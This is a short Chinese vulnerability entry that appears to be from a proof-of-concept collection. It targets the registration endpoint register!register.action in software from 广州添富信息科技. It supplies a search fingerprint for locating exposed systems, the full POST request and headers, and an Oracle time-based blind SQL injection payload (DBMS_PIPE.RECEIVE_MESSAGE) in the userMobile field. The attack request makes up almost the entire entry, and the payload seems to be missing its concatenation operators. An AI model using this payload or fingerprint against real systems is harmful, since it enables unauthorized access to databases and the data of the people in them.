# 广州添富信息科技注册接口register!register.action存在SQL注入漏洞

- **系统**：广州添富信息科技注册接口register!　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`body=" 赛飞软件"`
- **请求**：`POST /reg/register!register.action HTTP/1.1`
- **关键头**：`Content-Type: application/x-www-form-urlencoded`　`X-Requested-With: XMLHttpRequest`　`Cookie: JSESSIONID=7C9E314666C1A79D1E70CC8866E8EBCE`　`Content-Length: 317`

**请求体 / payload**
```
CodeNum=12345&ister.codeNum=12345&ister.company=test&ister.linkman=1&ister.maxCarNum=5&ister.password=TestPass123&ister.passwordConfirm=TestPass123&ister.userMobile=test'DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)CHR(98)CHR(98),5)'&ister.userName=testuser&ister.vcCode=12345
```
- **预期**：200　|　—